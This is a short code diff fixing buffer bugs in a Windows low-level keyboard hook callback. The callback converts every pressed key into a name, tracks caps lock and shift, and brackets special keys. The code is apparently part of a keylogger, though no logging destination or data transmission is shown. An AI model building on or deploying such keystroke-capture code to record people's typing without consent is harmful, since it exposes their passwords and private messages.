@@ -22,17 +22,18 @@ LRESULT CALLBACK handleKeysProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM 
  	if (nCode == HC_ACTION && (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)) {
 		static bool capslock = false;
 		static bool shift = false;
-		LPWSTR tmp = NULL;
+		TCHAR tmp[0xFF] = { 0 };
 		DWORD msg = 1;
 		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lParam);
 		bool printable;
 
-		LPWSTR str = NULL;
+		TCHAR str[0xFF] = { 0 };
 
 		msg += (st_hook.scanCode << 16);
 		msg += (st_hook.flags << 24);
 		GetKeyNameText(msg, tmp, 0xFF);
-		_tcscpy(str, tmp);
+
+		lstrcpy(str, tmp);		
 
 		printable = (_tcslen(tmp) <= 1) ? true : false;
 		if (_tcscmp(tmp, _T("CAPSLOCK"))) {
@@ -56,7 +57,7 @@ LRESULT CALLBACK handleKeysProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM 
 		else {
 			_tcscpy(str, _T("["));
 			_tcscat(str, tmp);
-			_tcscpy(str, _T("]"));
+			_tcscat(str, _T("]"));
 		}
 
 		if (printable) {
